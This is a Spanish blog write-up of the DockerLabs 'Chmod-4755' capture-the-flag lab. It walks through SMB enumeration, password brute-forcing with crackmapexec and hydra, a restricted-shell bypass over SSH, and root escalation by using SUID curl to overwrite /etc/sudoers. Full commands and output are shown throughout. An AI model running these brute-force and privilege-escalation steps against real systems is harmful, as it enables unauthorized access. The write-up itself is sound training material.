---
title: DockerLabs - Chmod-4755
summary: "Write-up del laboratorio Chmod-4755 de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_chmod-4755"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ nmap -sCV -p22,139,445 172.17.0.2                        
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a8:62:07:af:8e:77:13:6d:25:0a:2f:43:63:de:38:38 (ECDSA)
|_  256 93:93:a8:35:0e:fa:3e:05:04:27:70:2e:fc:22:e8:99 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-XX-XXTXX:XX:XX
|_  start_date: N/A
```

## análisis

Comenzaremos revisando los recursos disponibles por SMB de la máquina (tanto con **smbclient** y **smbmap**), donde destaca uno en específico por no ser de lo que solemos ver en otros casos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ smbclient -L \\\\172.17.0.2 -N                            

        Sharename          Type      Comment
        ---------          ----      -------
        print$             Disk      Printer Drivers
        *****************  Disk      
        IPC$               IPC       IPC Service (48750a6c792d server (Samba, Ubuntu))
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ smbmap -H 172.17.0.2              

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          

[+] IP: 172.17.0.2:445  Name: 404-not-found.hl          Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        *****************                                       NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (48750a6c792d server (Samba, Ubuntu))
[*] Closed 1 connections
```

Tratamos de obtener más información relacionada con la propia máquina con **crackmapexec**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ crackmapexec smb 172.17.0.2                                        
SMB         172.17.0.2      445    48750A6C792D     [*] Windows 6.1 Build 0 (name:48750A6C792D) (domain:48750A6C792D) (signing:False) (SMBv1:False)
```

Otra herramienta que podemos emplear para enumerar información de SMB es **enum4linux**, que en este caso nos descubre dos usuarios existentes:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ enum4linux -a 172.17.0.2

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                       

S-1-22-1-1000 Unix User\smbuser (Local User)                                                                                                                                                                      
S-1-22-1-1001 Unix User\rabol (Local User)
```

## acceso inicial SMB (smbuser)

Ahora trataremos de obtener por fuerza bruta la contraseña del usuario `smbuser` usando **crackmapexec** (o **nxc**, que es la nueva versión de **crackmapexec**), la cual, pasado un rato, nos la encuentra:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ crackmapexec smb 172.17.0.2 -u smbuser -p /usr/share/seclists/Passwords/rockyou.txt
SMB         172.17.0.2      445    48750A6C792D     [*] Windows 6.1 Build 0 (name:48750A6C792D) (domain:48750A6C792D) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    48750A6C792D     [-] 48750A6C792D\smbuser:123456 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    48750A6C792D     [-] 48750A6C792D\smbuser:12345 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    48750A6C792D     [-] 48750A6C792D\smbuser:123456789 STATUS_LOGON_FAILURE
...
SMB         172.17.0.2      445    48750A6C792D     [+] 48750A6C792D\smbuser:******
```

Ya que tenemos credenciales para SMB, nos conectamos al recurso que hemos encontrado anteriormente (que no es ni `print$` ni `IPC$`), el cual contiene una nota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ smbclient \\\\172.17.0.2\\\***************** -U "smbuser%*****" 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep  2 13:05:05 2024
  ..                                  D        0  Mon Sep  2 13:05:05 2024
  note.txt                            N       13  Mon Sep  2 13:05:05 2024

                76798724 blocks of size 1024. 33911680 blocks available
smb: \> get note.txt
getting file \note.txt of size 13 as note.txt (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
```

La nota nos indica que debemos volver a revisar lo que ya tenemos hasta ahora:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ cat note.txt                                                                       

read better
```

Por ello, trataremos de ver si alguno de los textos que hemos encontrado hasta ahora coincide con la contraseña del usuario `rabol`, que es el que todavía no sabemos para que se utiliza.

## movimiento lateral (rabol)

Otro de los recursos que hemos visto que el usuario `smbuser` puede listar es `print$`, donde encontramos un listado de directorios, así que lo que vamos a hacer es crear un diccionario con todos los nombres de las carpetas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ smbclient \\\\172.17.0.2\\print$ -U "smbuser%fuckit"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep  2 13:07:41 2024
  ..                                  D        0  Mon Sep  2 13:07:41 2024
  W32PPC                              D        0  Mon Apr  8 15:49:25 2024
  color                               D        0  Mon Sep  2 13:07:41 2024
  x64                                 D        0  Mon Sep  2 13:07:41 2024
  IA64                                D        0  Mon Apr  8 15:49:25 2024
  WIN40                               D        0  Mon Apr  8 15:49:25 2024
  W32ALPHA                            D        0  Mon Apr  8 15:49:25 2024
  W32X86                              D        0  Mon Sep  2 13:07:41 2024
  ARM64                               D        0  Mon Sep  2 13:07:41 2024
  COLOR                               D        0  Mon Apr  8 15:49:25 2024
  W32MIPS                             D        0  Mon Apr  8 15:49:25 2024

smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
smb: \> exit

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ tree
.
├── ARM64
├── color
├── COLOR
├── IA64
├── W32ALPHA
├── W32MIPS
├── W32PPC
├── W32X86
│   └── PCC
├── WIN40
└── x64
    └── PCC

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ cat wordlist 
ARM64
color
COLOR
IA64
W32ALPHA
W32MIPS
W32PPC
W32X86
WIN40
x64
PCC
```

Sin embargo, a la hora de tratar de comprobar si alguno de los nombres de los directorios es la contraseña del usuario `rabol` por SSH, vemos que no es el caso:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ hydra -l rabol -P wordlist 172.17.0.2 ssh -I -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
1 of 1 target completed, 0 valid password found
```

Otra posibilidad es que la contraseña del usuario `rabol` sea el nombre de alguno de los recursos que encontramos por SMB, por lo que los añadimos al diccionario y volvemos a ejecutar **hydra**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ hydra -l rabol -P wordlist 172.17.0.2 ssh -I -t 64  
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:1/p:14), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: rabol   password: *****************
1 of 1 target successfully completed, 1 valid password found
```

Teniendo ya la contraseña del usuario `rabol` para SSH, procedemos a conectarnos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ ssh rabol@172.17.0.2                                
rabol@48750a6c792d:~$ whoami
-rbash: whoami: command not found
```

Vemos que, aunque tenemos acceso, la consola que este usuario tiene asignada es una **Restricted Bash** (consola con gran parte de los comandos deshabilitados).

Para saltarnos esta restricción, lo que podemos hacer es indicar un comando a la hora de conectarnos, el cual queremos que se ejecute antes de que nos otorgue la consola, que se hace simplemente indicándolo como parámetro final del comando **ssh**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chmod-4755]
└─$ ssh rabol@172.17.0.2 bash
**************************************************
*   WARNING: Unauthorized Access is Prohibited!  *
*   This system is for authorized users only.    *
*   All activities are monitored and recorded.   *
*                  by fuckit                     *
**************************************************
rabol@172.17.0.2`s password: 
id
uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)
whoami
rabol
hostname -I
172.17.0.2
```

De esta manera habremos obtenido una consola completamente interactiva y sin restricciones como el usuario `rabol`.

Obtendremos en este punto el listado de usuarios que tengan asignados una consola en el fichero `/etc/passwd` de la máquina:

```bash
$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
rabol:x:1001:1001:rabol,,,:/home/rabol:/bin/rbash
smbuser:x:1000:1000:smbuser,,,:/home/smbuser:/bin/bash
```

En la carpeta principal del usuario `rabol` encontramos la primera flag:

```bash
$ cat user.txt
04ae****************************
```

## escalada de privilegios (root)

Ahora buscaremos los binarios cuyos permisos sean **SUID** (se pueden ejecutar con los permisos del propietario), y de entre todos, destaca **/usr/bin/curl**:

```bash
$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/curl
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Nos indican el [GTFOBins](https://gtfobins.github.io/gtfobins/curl/#suid) que el binario **/usr/bin/curl** nos permite leer y escribir ficheros cuando tiene permisos SUID, tanto de una ubicación externa como interna (empleando el wrapper `file://`), como también escribir los ficheros leídos en otra ubicación fuera de la máquina.

En este caso, optaremos por la solución que implica modificar el fichero `/etc/sudoers` para agregar el usuario `rabol`, y de esta manera poder ejecutar comandos como el usuario `root`. Sin embargo, otras opciones a considerar podrían ser:
- Modificar el fichero `/etc/passwd` para agregar un nuevo usuario con permisos `root`.
- Modificar el fichero `/etc/shadow` para indicar una nueva contraseña para el usuario `root`.

Lo primero que debemos hacer es copiar el fichero `/etc/sudoers` a una carpeta en la que tengamos permisos de escritura, como por ejemplo, la carpeta principal del usuario `rabol`:

```bash
$ curl file:///etc/sudoers -o /home/rabol/sudoers
curl file:///etc/sudoers -o /home/rabol/sudoers
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1800  100  1800    0     0  4031k      0 --:--:-- --:--:-- --:--:-- 4031k
```

Lo siguiente es agregar una nueva línea al final del fichero, la cual indicará que el usuario `rabol` tiene permisos elevados en el sistema:

```bash
$ echo "rabol ALL=(ALL:ALL) ALL" >> sudoers
```

Por último, debemos copiar la versión modificada del fichero `/etc/sudoers`, y sustituirla por la versión original en la ubicación por defecto:

```bash

$ curl file:///home/rabol/sudoers -o /etc/sudoers
curl file:///home/rabol/sudoers -o /etc/sudoers
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1824  100  1824    0     0   326k      0 --:--:-- --:--:-- --:--:--  326k
```

Si ahora volvemos a comprobar el contenido del fichero `/etc/sudoers`, veremos que se ha modificado exitosamente:

```bash
$ curl file:///etc/sudoers
curl file:///etc/sudoers
...
# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
rabol ALL=(ALL:ALL) ALL
```

Tratamos ahora de invocar una consola como el usuario `root`, y veremos que nos pide la contraseña del usuario `rabol`, pero una vez indicada, nos otorga la consola elevada sin problemas:

```bash
$ sudo su
sudo su
[sudo] password for rabol: *****************

root@48750a6c792d:/home/rabol# whoami
whoami
root
```

Ahora ya podremos visualizar la segunda flag:

```bash
root@48750a6c792d:/home/rabol# cat /root/root.txt
cat /root/root.txt 
1e4e****************************
```

Y de esta manera habremos completado el laboratorio **Chmod-4755**!




<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>